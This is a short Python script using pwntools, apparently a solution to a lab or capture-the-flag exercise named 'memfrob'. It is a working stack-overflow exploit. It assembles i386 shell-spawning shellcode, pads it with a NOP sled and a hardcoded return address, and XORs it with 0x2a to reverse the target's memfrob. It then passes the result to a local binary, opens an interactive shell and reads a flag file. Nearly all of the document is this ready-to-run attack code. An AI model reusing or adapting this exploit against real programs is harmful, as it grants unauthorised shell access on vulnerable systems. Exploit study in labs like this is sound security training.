from pwn import *

context.update(arch='i386', os='linux')

shellcode = asm(shellcraft.sh())

shellcode = b"\x90" * (0x80 + 4 - (len(shellcode) % 4) ) + shellcode # 0xb0
shellcode += asm("nop") * (0x100 - 0xb0)
shellcode += b"a" * 4
shellcode += p32(0xffffd338)

print(len(shellcode))

payload = b""

payload = bytes(c ^ 0x2a for c in shellcode)

# 256 + 4 + 4 = 264

p = process(['/home/lab05/memfrob/target', payload])
p.interactive()

# cat /proc/flag